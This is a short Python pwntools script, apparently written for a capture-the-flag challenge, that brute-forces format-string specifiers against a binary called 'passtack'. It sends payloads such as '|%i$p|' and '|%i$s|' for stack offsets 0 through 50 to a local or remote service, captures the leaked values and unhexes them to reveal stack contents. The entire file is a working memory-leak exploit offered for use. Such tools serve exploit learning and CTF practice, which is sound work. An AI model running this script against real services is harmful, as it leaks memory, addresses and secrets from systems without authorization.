#!/usr/bin/env python3
# *~ author: @TheFlash2k

'''
Printing all the specifier's value using PRINTF.
Helps in format string bugs.
'''

from pwn import *
import sys

context.log_level = 'error'

''' Set this to the binary you want to brute-force '''
exe = "passtack"
elf = context.binary = ELF("passtack")

def get_context():
        if args.REMOTE:
                return remote(sys.argv[1], int(sys.argv[2]))
        return process()

''' Set this to the start of the loop '''
INIT_CHECK =0

''' Set this to the max checks you want to run
NOTE: This includes the MAX_CHECK value as well.
'''
MAX_CHECK = 50

''' Print all these specifier's returned value. '''
SPECIFIERS = ['s','p','x'] #SPECIFIERS = ['x','p','lx','s','d']

''' Unhex the output of the following specifiers '''
UNHEX_SPECS = ['x', 'p', 'lx']

f_res = []
for i in range(INIT_CHECK, MAX_CHECK+1):
        res = {}
        res['curr'] = i
        for SPEC in SPECIFIERS:
                try:
                        # io = get_context()
                        io = remote("127.0.0.1",9998)
                        io.sendline(f'|%{i}${SPEC}|'.encode())
                        io.recvline()
                        # io.recvline()
                        io.recvuntil(b'|')
                        buf = io.recvuntil(b'|')[:-1]
                        res[SPEC] = buf
                        if SPEC.lower() in UNHEX_SPECS:
                                if "unhex" not in res.keys(): res["unhex"] = []
                                if res[SPEC][:2] == b"0x": res[SPEC] = res[SPEC][2:]
                                res["unhex"].append({SPEC : unhex(res[SPEC])[::-1]})
                except Exception as E:
                        if SPEC not in res.keys():
                                res[SPEC] = "[ERROR]"
                        pass
        f_res.append(res)
        '''
        The res dictionary will contain everything
        You can control what you want print
        '''
        print(res)
        
        
